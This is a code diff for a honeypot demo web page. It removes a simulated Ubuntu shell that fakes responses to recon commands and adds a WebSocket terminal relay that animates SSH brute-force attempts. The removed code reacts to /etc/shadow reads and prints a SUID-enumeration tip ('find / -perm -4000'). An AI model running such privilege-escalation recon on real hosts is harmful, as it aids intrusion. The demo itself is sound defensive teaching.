-        else if (flags.includes('r')) ln('5.15.0-91-generic');
-        else if (flags.includes('s')) ln('Linux');
-        else ln('Linux');
-        return;
-      }
-
-      if (cmd === 'which') {
-        const known = {bash:'/bin/bash',sh:'/bin/sh',python3:'/usr/bin/python3',python:'/usr/bin/python3',perl:'/usr/bin/perl',wget:'/usr/bin/wget',curl:'/usr/bin/curl',ls:'/bin/ls',cat:'/bin/cat',id:'/usr/bin/id',find:'/usr/bin/find',nc:'/usr/bin/nc',netcat:'/usr/bin/nc',nmap:'',sudo:'/usr/bin/sudo'};
-        const t = posArgs[0] || '';
-        if (known[t] === '') ln(`${args[0]}: not found`, 'ce');
-        else if (known[t]) ln(known[t], 'cdim');
-        else ln(`${args[0]}: not found`, 'ce');
-        return;
-      }
-
-      if (cmd === 'python3' || cmd === 'python') {
-        if (args.length === 0) { ln('Python 3.10.12 (main, Jun 11 2023, 05:26:28) [GCC 11.4.0] on linux', 'cdim'); ln('Type "help", "copyright", "credits" or "license" for more information.', 'cdim'); ln('>>> ', 'cdim'); ln('(non-interactive — use python3 -c "..." instead)', 'cdim'); }
-        else if (flags.includes('c') || args[0] === '-c') ln('', 'cdim');
-        else if (args[0] === '--version' || args[0] === '-V') ln('Python 3.10.12');
-        return;
-      }
-
-      if (cmd === 'ls') {
-        let target = cwd;
-        if (posArgs.length) target = resolvePath(posArgs[0]);
-        const entry = FS[target];
-        if (!entry) { ln('ls: cannot access \'' + (posArgs[0]||target) + '\': No such file or directory', 'ce'); return; }
-        if (entry.type !== 'dir') { ln(posArgs[0] || target); return; }
-
-        let entries = [...(entry.e || [])];
-        const showHidden = flags.includes('a') || flags.includes('A');
-        const longFmt    = flags.includes('l');
-        if (!showHidden) entries = entries.filter(e => !e.n.startsWith('.'));
-
-        if (showHidden && flags.includes('a')) {
-          // prepend . and ..
-          entries = [{n:'.',t:'d',mt:todayStr},{n:'..',t:'d',mt:oldStr},...entries];
+        case 'banner': {
+          term.write('\x1b[32m$ ssh user@honeypot.ximg.app\r\n');
+          await sleep(250);
+          term.write('\x1b[2m');
+          term.write("The authenticity of host 'honeypot.ximg.app (10.13.37.42)' can't be established.\r\n");
+          await sleep(100);
+          term.write(`RSA key fingerprint is ${msg.fp}.\r\n`);
+          await sleep(100);
+          term.write('This key is not known by any other names.\r\n');
+          await sleep(200);
+          term.write("Are you sure you want to continue connecting (yes/no/[fingerprint])? \x1b[0m");
+          await sleep(650);
+          await typeText('yes');
+          term.write('\r\n');
+          await sleep(250);
+          term.write("\x1b[33mWarning: Permanently added 'honeypot.ximg.app' (RSA) to the list of known hosts.\x1b[0m\r\n");
+          await sleep(400);
+          setStatus('connecting', 'CONNECTING', 'connecting');
+          break;
         }
 
-        if (longFmt) {
-          const total = entries.reduce((s, e) => s + (e.t === 'd' ? 4096 : (e.sz||512)), 0);
-          ln('total ' + Math.ceil(total/1024 * 4), 'cdim');
-          for (const e of entries) {
-            const perm = e.t === 'd' ? 'drwxr-xr-x' : (e.n.startsWith('.') && e.n !== '.' && e.n !== '..' ? '-rw-r--r--' : '-rw-r--r--');
-            const perms2 = e.n === '.ssh' ? 'drwx------' : e.n === '.bash_history' ? '-rw-------' : perm;
-            const sz = String(e.sz !== undefined ? e.sz : 4096).padStart(7);
-            const mt = e.mt || oldStr;
-            const cls = e.t === 'd' ? 'cdi' : 'cg';
-            ln(perms2 + ' 1 user user' + sz + ' ' + mt + ' ' + e.n, cls);
-          }
-        } else {
-          const parts = entries.map(e => `<span class="${e.t==='d'?'cdi':'cg'}">${e.n}</span>`);
-          // arrange in columns (roughly 4 per row)
-          const cols = 4;
-          for (let i = 0; i < parts.length; i += cols) {
-            lnHTML(parts.slice(i, i+cols).map(p => p.padEnd ? p : p).join('  '));
-          }
+        case 'auth_fail': {
+          const n = msg.n;
+          sbAtt.textContent = String(n);
+          setStatus('connecting', `ATTEMPT ${n}/10`, 'connecting');
+          setDot(n - 1, 'fail');
+
+          term.write("\x1b[2muser@honeypot.ximg.app's password: \x1b[0m");
+          await sleep(ri(350, 600));
+          await typeAsterisks(ri(6, 14));
+          await sleep(ri(180, 320));
+          term.write('\r\n\x1b[31mPermission denied, please try again.\x1b[0m\r\n');
+          break;
         }
-        return;
-      }
 
-      if (cmd === 'cd') {
-        const target = posArgs[0] ? resolvePath(posArgs[0]) : '/home/user';
-        if (FS[target]) {
-          if (FS[target].type !== 'dir') { ln('bash: cd: ' + posArgs[0] + ': Not a directory', 'ce'); }
-          else cwd = target;
-        } else { ln('bash: cd: ' + (posArgs[0]||'') + ': No such file or directory', 'ce'); }
-        prompt.textContent = getPromptStr();
-        return;
-      }
+        case 'auth_ok': {
+          sbAtt.textContent = '10 ✓';
+          setStatus('connecting', 'ATTEMPT 10/10', 'connecting');
+          setDot(9, 'ok');
 
-      if (cmd === 'cat') {
-        if (!args.length) { ln('cat: missing operand', 'ce'); return; }
-        const path = resolvePath(args[0]);
-        if (path === '/etc/shadow') { ln('cat: /etc/shadow: Permission denied', 'ce'); return; }
-        if (path === '/root/.bash_history' || path.startsWith('/root/')) { ln('cat: ' + args[0] + ': Permission denied', 'ce'); return; }
-        if (FS[path] && FS[path].type === 'dir') { ln('cat: ' + args[0] + ': Is a directory', 'ce'); return; }
-        const content = FILES[path];
-        if (content !== undefined) {
-          content.split('\n').forEach(l => ln(l));
-        } else { ln('cat: ' + args[0] + ': No such file or directory', 'ce'); }
-        return;
-      }
+          term.write("\x1b[2muser@honeypot.ximg.app's password: \x1b[0m");
+          await sleep(ri(500, 750));
+          await typeAsterisks(ri(8, 13));
+          await sleep(350);
+          term.write('\r\n');
 
-      if (cmd === 'echo') {
-        ln(args.join(' '));
-        return;
-      }
+          // Activate live relay
+          shellActive = true;
+          for (const chunk of ptyBuf) term.write(chunk);
+          ptyBuf = [];
 
-      if (cmd === 'ps') {
-        const hm = fmtHM(NOW);
-        const pid2 = ri(150,199);
-        ln('USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND', 'cdim');
-        ln('root           1  0.0  0.0   2616   940 ?        Ss   08:42   0:00 /bin/sh /entrypoint.sh', 'cg2');
-        ln('root           7  0.1  0.8  11812  8864 ?        S    08:42   0:12 python3 /usr/lib/openssh/session-handler', 'cg2');
-        ln('user         142  0.0  0.2   6668  2772 pts/0    Ss   ' + hm + '  0:00 -bash');
-        ln('user         ' + pid2 + '  0.0  0.1   8508  1720 pts/0    R+   ' + hm + '  0:00 ps' + (args.length?' '+args.join(' '):''));
-        return;
-      }
-
-      if (cmd === 'ip') {
-        const sub = args[0];
-        if (sub === 'addr' || sub === 'a' || sub === 'address') {
-          ln('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000', 'cdim');
-          ln('    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00', 'cdim');
-          ln('    inet 127.0.0.1/8 scope host lo');
-          ln('       valid_lft forever preferred_lft forever', 'cdim');
-          ln('    inet6 ::1/128 scope host', 'cdim');
-          ln('       valid_lft forever preferred_lft forever', 'cdim');
-          ln('2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000', 'cdim');
-          ln('    link/ether 02:42:ac:14:00:05 brd ff:ff:ff:ff:ff:ff', 'cdim');
-          ln('    inet 172.20.0.5/16 brd 172.20.255.255 scope global eth0');
-          ln('       valid_lft forever preferred_lft forever', 'cdim');
-        } else if (sub === 'route' || sub === 'r') {
-          ln('default via 172.20.0.1 dev eth0');
-          ln('172.20.0.0/16 dev eth0 proto kernel scope link src 172.20.0.5', 'cg2');
-        } else { ln('ip: command not found: ' + args.join(' '), 'ce'); }
-        return;
-      }
-
-      if (cmd === 'ifconfig') {
-        ln('eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500');
-        ln('        inet 172.20.0.5  netmask 255.255.0.0  broadcast 172.20.255.255');
-        ln('        ether 02:42:ac:14:00:05  txqueuelen 0  (Ethernet)', 'cdim');
-        ln('        RX packets 41892  bytes 3847291 (3.8 MB)', 'cdim');
-        ln('        TX packets 39104  bytes 5293847 (5.2 MB)', 'cdim');
-        blankLine();
-        ln('lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536');
-        ln('        inet 127.0.0.1  netmask 255.0.0.0');
-        ln('        loop  txqueuelen 1000  (Local Loopback)', 'cdim');
-        return;
-      }
-
-      if (cmd === 'ss' || cmd === 'netstat') {
-        ln('Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process', 'cdim');
-        ln('tcp    LISTEN  0       128     0.0.0.0:22          0.0.0.0:*');
-        ln('tcp    LISTEN  0       128     [::]:22             [::]:*');
-        return;
-      }
-
-      if (cmd === 'history') {
-        const h = FILES['/home/user/.bash_history'].split('\n');
-        h.forEach((line, i) => ln('  ' + String(i+1).padStart(3) + '  ' + line, 'cdim'));
-        return;
-      }
-
-      if (cmd === 'env' || cmd === 'printenv') {
-        ln('TERM=xterm-256color');
-        ln('HOME=/home/user');
-        ln('USER=user');
-        ln('LOGNAME=user');
-        ln('SHELL=/bin/bash');
-        ln('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
-        ln('LANG=en_US.UTF-8');
-        ln('LC_ALL=en_US.UTF-8');
-        return;
-      }
-
-      if (cmd === 'sudo') {
-        if (args[0] === '-l' || args[0] === '-lU') {
-          ln('[sudo] password for user: ');
-          setTimeout(() => ln('Sorry, user user may not run sudo on web01.', 'ce'), 800);
-        } else {
-          ln('[sudo] password for user: ');
-          setTimeout(() => ln('Sorry, user user is not allowed to execute \'' + args.join(' ') + '\' as root on web01.', 'ce'), 800);
+          setStatus('ok', 'CONNECTED', 'ok');
+          break;
         }
-        return;
-      }
 
-      if (cmd === 'su') {
-        ln('Password: ');
-        setTimeout(() => ln('su: Authentication failure', 'ce'), 900);
-        return;
-      }
-
-      if (cmd === 'find') {
-        const hasSUID  = args.includes('-4000') || args.includes('-u=s') || args.join(' ').includes('-perm -u=s') || args.join(' ').includes('-perm -4000');
-        const hasWrite = args.join(' ').includes('-writable') || args.join(' ').includes('-perm -222');
-        if (hasSUID) {
-          ['/usr/bin/su','/usr/bin/passwd','/usr/bin/chsh','/usr/bin/chfn','/usr/bin/gpasswd','/usr/bin/newgrp','/usr/bin/umount','/usr/bin/mount','/usr/lib/openssh/ssh-keysign','/usr/lib/dbus-1.0/dbus-daemon-launch-helper','/bin/su','/bin/umount','/bin/mount','/bin/ping'].forEach(f => ln(f, 'cw'));
-        } else if (hasWrite) {
-          ln('/tmp', 'cg2');
-          ln('/var/tmp', 'cg2');
-          ln('/dev/shm', 'cg2');
-        } else {
-          ln('find: \'/root\': Permission denied', 'ce');
-          ln('find: \'/proc/tty/driver\': Permission denied', 'ce');
-          ln('find: \'/proc/1/fd\': Permission denied', 'ce');
+        case 'error': {
+          term.write(`\r\n\x1b[31mError: ${msg.msg}\x1b[0m\r\n`);
+          setStatus('failed', 'ERROR', 'failed');
+          replayBtn.disabled = false;
+          break;
         }
-        return;
       }
-
-      if (cmd === 'wget') {
-        const url = posArgs[0] || '';
-        const host = (url.split('/')[2] || url || 'host');
-        ln('--' + NOW.toISOString().slice(0,19) + '--  ' + url, 'cdim');
-        ln('Resolving ' + host + ' (' + host + ')... failed: Temporary failure in name resolution.', 'ce');
-        ln('wget: unable to resolve host address \'' + host + '\'', 'ce');
-        return;
-      }
-
-      if (cmd === 'curl') {
-        const url = posArgs[0] || '';
-        const host = url.split('/')[2] || url;
-        ln('curl: (6) Could not resolve host: ' + host, 'ce');
-        return;
-      }
-
-      if (cmd === 'ping') {
-        const host = posArgs[0] || 'host';
-        ln('PING ' + host + ' (8.8.8.8) 56(84) bytes of data.', 'cdim');
-        ln('ping: connect: Network is unreachable', 'ce');
-        return;
-      }
-
-      if (cmd === 'nc' || cmd === 'netcat') {
-        ln('nc: getaddrinfo for host "' + (posArgs[0]||'host') + '": Temporary failure in name resolution', 'ce');
-        return;
-      }
-
-      if (cmd === 'w' || cmd === 'who') {
-        ln(' ' + fmtHM(NOW) + ':00 up ' + ri(1,14) + ' days, ' + ri(0,23) + ':' + String(ri(0,59)).padStart(2,'0') + ',  1 user,  load average: 0.08, 0.03, 0.01', 'cdim');
-        ln('USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT', 'cdim');
-        ln('user     pts/0    ' + ri(1,254) + '.' + ri(1,254) + '.' + ri(1,254) + '.' + ri(1,254) + '   ' + fmtHM(NOW) + '    0.00s  0.04s  0.00s -bash');
-        return;
-      }
-
-      if (cmd === 'uptime') {
-        ln(' ' + NOW.toTimeString().slice(0,8) + ' up ' + ri(1,14) + ' days, ' + ri(0,23) + ':' + String(ri(0,59)).padStart(2,'0') + ',  1 user,  load average: 0.08, 0.03, 0.01');
-        return;
-      }
-
-      if (cmd === 'df') {
-        ln('Filesystem     1K-blocks    Used Available Use% Mounted on', 'cdim');
-        ln('overlay         61255432 8547300  49568284  15% /');
-        ln('tmpfs              65536       0     65536   0% /dev', 'cdim');
-        ln('/dev/sda1       61255432 8547300  49568284  15% /etc/hosts', 'cdim');
-        ln('shm               65536       0     65536   0% /dev/shm', 'cdim');
-        return;
-      }
-
-      if (cmd === 'free') {
-        ln('               total        used        free      shared  buff/cache   available', 'cdim');
-        ln('Mem:         2048000      360960     1524800        4096      163840     1687040');
-        ln('Swap:              0           0           0', 'cdim');
-        return;
-      }
-
-      if (cmd === 'file') {
-        const p = posArgs[0];
-        if (p === '/bin/bash') ln('/bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=01234..., stripped');
-        else if (p) ln(p + ': data');
-        return;
-      }
-
-      if (cmd === 'date') { ln(NOW.toString()); return; }
-      if (cmd === 'whoami') { ln('user'); return; }
-      if (cmd === 'last') {
-        ln('user     pts/0        ' + ri(1,254) + '.' + ri(1,254) + '.' + ri(1,254) + '.' + ri(1,254) + '   ' + NOW.toString().slice(0,24));
-        ln('wtmp begins Mon Nov 15 00:00:01 2023', 'cdim');
-        return;
-      }
-
-      if (cmd === 'exit') {
-        blankLine();
-        ln('logout', 'cdim');
-        ln('Connection to honeypot.ximg.app closed.', 'cdim');
-        live = false;
-        iline.classList.remove('on');
-        setStatus('', 'DISCONNECTED');
-        sdot.className = 'sdot';
-        blankLine();
-        ln('─────────────────────────────────────────', 'cdim');
-        ln('  Session closed. Press REPLAY to reconnect.', 'cdim');
-        ln('─────────────────────────────────────────', 'cdim');
-        replayBtn.disabled = false;
-        return;
-      }
-
-      if (cmd === 'help') {
-        ln('Simulated honeypot shell (Ubuntu 22.04)', 'cbr');
-        blankLine();
-        ln('  Filesystem:   ls  cd  cat  pwd  find  file', 'cg2');
-        ln('  System:       ps  ip  ifconfig  ss  netstat  df  free', 'cg2');
-        ln('  Network:      wget  curl  ping  nc', 'cg2');
-        ln('  Info:         id  whoami  uname  hostname  uptime  date  last  w', 'cg2');
-        ln('  Shell:        echo  env  history  which  python3', 'cg2');
-        ln('  Privilege:    sudo  su', 'cg2');
-        ln('  Session:      clear  exit', 'cg2');
-        blankLine();
-        ln('  Tip: try  cat /home/user/.bash_history', 'cdim');
-        ln('       or   find / -perm -4000 -type f 2>/dev/null', 'cdim');
-        return;
-      }
-
-      if (cmd === 'bash' || cmd === 'sh') {
-        // already in bash
-        return;
-      }
-
-      // Unknown
-      ln('bash: ' + cmd + ': command not found', 'ce');
     }
 
-    // ── SSH connection sequence ───────────────────────────────
-    async function runSequence() {
-      if (seqRunning) return;
-      seqRunning = true;
-      live = false;
+    // ── Connect / replay ──────────────────────────────────────────────────
+    function connect () {
+      if (ws && ws.readyState < 2) ws.close();
+      term.reset();
+      shellActive = false;
+      ptyBuf      = [];
+      msgQueue    = [];
+      queueRunning = false;
+      initDots();
+      sbAtt.textContent = '0';
+      setStatus('connecting', 'CONNECTING', 'connecting');
       replayBtn.disabled = true;
-      iline.classList.remove('on');
-      out.innerHTML = '';
-      cwd = '/home/user';
-      initDots();
-      cmdHistory = [];
-      histIdx = -1;
 
-      setStatus('connecting', 'CONNECTING');
-      sbAttempts.textContent = '0';
+      const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+      ws = new WebSocket(`${proto}://${location.host}/ws`);
+      ws.binaryType = 'arraybuffer';
 
-      await sleep(300);
+      ws.onopen = () => {
+        ws.send(JSON.stringify({ t: 'init', cols: term.cols, rows: term.rows }));
+      };
 
-      // show prompt + command
-      lnHTML('<span class="cdim">$ </span><span class="cco">ssh user@honeypot.ximg.app</span>');
-      await sleep(350);
-
-      // SSH version exchange happens silently, then fingerprint
-      const fp = randFP();
-      ln('The authenticity of host \'honeypot.ximg.app (10.13.37.42)\' can\'t be established.', 'cdim');
-      await sleep(120);
-      ln('RSA key fingerprint is SHA256:' + fp + '.', 'cdim');
-      await sleep(120);
-      ln('This key is not known by any other names.', 'cdim');
-      await sleep(150);
-
-      // Build yes/no line
-      const ynSpan = document.createElement('span');
-      ynSpan.className = 'ln cdim';
-      ynSpan.textContent = 'Are you sure you want to continue connecting (yes/no/[fingerprint])? ';
-      out.appendChild(ynSpan);
-      out.appendChild(document.createTextNode('\n'));
-      scrollBot();
-
-      await sleep(700);
-      ynSpan.textContent += 'yes';
-      ynSpan.className = 'ln cg';
-      scrollBot();
-      await sleep(250);
-
-      ln('Warning: Permanently added \'honeypot.ximg.app\' (RSA) to the list of known hosts.', 'cw');
-      await sleep(450);
-
-      // 9 failures
-      const pwds = ['password123','admin','root1234','ubuntu22','qwerty!1','P@ssw0rd','s3cur1ty!','n0t4hack3r','honeypot99'];
-
-      for (let i = 0; i < 9; i++) {
-        sbAttempts.textContent = String(i + 1);
-        setStatus('connecting', 'ATTEMPT ' + (i+1) + '/10');
-
-        // password prompt line (builds up)
-        const pwLine = document.createElement('span');
-        pwLine.className = 'ln cdim';
-        pwLine.textContent = 'user@honeypot.ximg.app\'s password: ';
-        out.appendChild(pwLine);
-        out.appendChild(document.createTextNode('\n'));
-        scrollBot();
-
-        await sleep(ri(350, 600));
-
-        // type asterisks
-        const pw = pwds[i];
-        for (let j = 0; j < pw.length; j++) {
-          pwLine.textContent += '*';
-          scrollBot();
-          await sleep(ri(70, 130));
+      ws.onmessage = e => {
+        if (e.data instanceof ArrayBuffer) {
+          const data = new Uint8Array(e.data);
+          if (shellActive) term.write(data);
+          else ptyBuf.push(data);
+          return;
         }
-        await sleep(ri(180, 320));
+        try {
+          msgQueue.push(JSON.parse(e.data));
+          runQueue();
+        } catch {}
+      };
 
-        setDot(i, 'fail');
-        ln('Permission denied, please try again.', 'ce');
+      ws.onclose = () => {
+        if (shellActive) {
+          term.write('\r\n\x1b[2m\r\n─────────────────────────────\r\nConnection closed.\x1b[0m\r\n');
+        }
+        setStatus('', 'DISCONNECTED', '');
+        sdot.className = 'sdot';
+        replayBtn.disabled = false;
+        shellActive = false;
+      };
 
-        // brief pause between attempts (gets shorter — more desperate)
-        await sleep(600 - i * 40);
-      }
+      ws.onerror = () => {
+        term.write('\r\n\x1b[31mWebSocket error — cannot reach proxy server.\x1b[0m\r\n');
+        setStatus('failed', 'ERROR', 'failed');
+        replayBtn.disabled = false;
+      };
 
-      // Attempt 10 — SUCCESS
-      sbAttempts.textContent = '10';
-      setStatus('connecting', 'ATTEMPT 10/10');
-
-      const pwLine10 = document.createElement('span');
-      pwLine10.className = 'ln cdim';
-      pwLine10.textContent = 'user@honeypot.ximg.app\'s password: ';
-      out.appendChild(pwLine10);
-      out.appendChild(document.createTextNode('\n'));
-      scrollBot();
-
-      await sleep(ri(500, 750));
-
-      const finalPwd = 'h0n3yp0t!';
-      for (const ch of finalPwd) {
-        pwLine10.textContent += '*';
-        scrollBot();
-        await sleep(ri(80, 140));
-      }
-      await sleep(400);
-
-      setDot(9, 'ok');
-      setStatus('ok', 'CONNECTED');
-      sbAttempts.textContent = '10 ✓';
-
-      blankLine();
-
-      // MOTD
-      for (const line of MOTD_LINES) {
-        if (line.includes('Welcome to Ubuntu')) ln(line, 'cbr');
-        else if (line.startsWith(' * ')) ln(line, 'cdim');
-        else if (line.includes('System information')) ln(line, 'cmt');
-        else if (line.includes('Last login')) ln(line, 'cw');
-        else if (line === '') blankLine();
-        else ln(line, 'cg2');
-        await sleep(50);
-      }
-
-      blankLine();
-      blankLine();
-
-      // activate shell
-      prompt.textContent = getPromptStr();
-      live = true;
-      iline.classList.add('on');
-      scrollBot();
-      ci.focus();
-      seqRunning = false;
-      replayBtn.disabled = false;
+      // Relay keystrokes
+      term.onData(data => {
+        if (shellActive && ws.readyState === 1) ws.send(data);
+      });
     }
 
-    function replay() {
-      runSequence();
-    }
-
-    function focusInput() {
-      if (live) ci.focus();
-    }
-
-    // ── Keyboard input ────────────────────────────────────────
-    ci.addEventListener('keydown', e => {
-      if (!live) return;
-
-      if (e.key === 'Enter') {
-        const val = ci.value;
-        ci.value = '';
-        if (val.trim()) {
-          cmdHistory.unshift(val.trim());
-          if (cmdHistory.length > 50) cmdHistory.pop();
-        }
-        histIdx = -1;
-        execCmd(val);
-        prompt.textContent = getPromptStr();
-        scrollBot();
-        return;
-      }
-
-      if (e.key === 'ArrowUp') {
-        e.preventDefault();
-        if (cmdHistory.length) {
-          histIdx = Math.min(histIdx + 1, cmdHistory.length - 1);
-          ci.value = cmdHistory[histIdx];
-          ci.setSelectionRange(ci.value.length, ci.value.length);
-        }
-        return;
-      }
-
-      if (e.key === 'ArrowDown') {
-        e.preventDefault();
-        if (histIdx > 0) {
-          histIdx--;
-          ci.value = cmdHistory[histIdx];
-        } else {
-          histIdx = -1;
-          ci.value = '';
-        }
-        ci.setSelectionRange(ci.value.length, ci.value.length);
-        return;
-      }
-
-      if (e.key === 'Tab') {
-        e.preventDefault();
-        // basic tab completion for common commands
-        const v = ci.value;
-        const cmds = ['ls','cat','cd','pwd','ps','ip','ifconfig','ss','netstat','find','wget','curl','ping','history','env','sudo','uname','hostname','whoami','id','df','free','uptime','date','w','who','echo','which','python3','file','help','clear','exit','nc'];
-        const last = v.split(' ').pop();
-        if (!v.includes(' ')) {
-          const matches = cmds.filter(c => c.startsWith(last));
-          if (matches.length === 1) ci.value = v.slice(0, v.length - last.length) + matches[0];
-        }
-        return;
-      }
-
-      // Ctrl+C
-      if (e.ctrlKey && e.key === 'c') {
-        e.preventDefault();
-        const pr = getPromptStr();
-        lnHTML('<span class="cpr">' + pr + '</span><span class="cco">' + ci.value + '</span><span class="ce">^C</span>');
-        ci.value = '';
-        scrollBot();
-        return;
-      }
-
-      // Ctrl+L
-      if (e.ctrlKey && e.key === 'l') {
-        e.preventDefault();
-        out.innerHTML = '';
-        return;
+    // Relay terminal resize to server
+    term.onResize(({ cols, rows }) => {
+      if (ws && ws.readyState === 1) {
+        ws.send(JSON.stringify({ t: 'resize', cols, rows }));
       }
     });
 
-    // ── Boot ──────────────────────────────────────────────────
-    window.addEventListener('load', () => {
-      initDots();
-      runSequence();
-    });
+    function replay () {
+      connect();
+    }
 
+    // Boot
+    connect();
   })();
   </script>
   <script src="/shared/nav.js?v=2"></script>
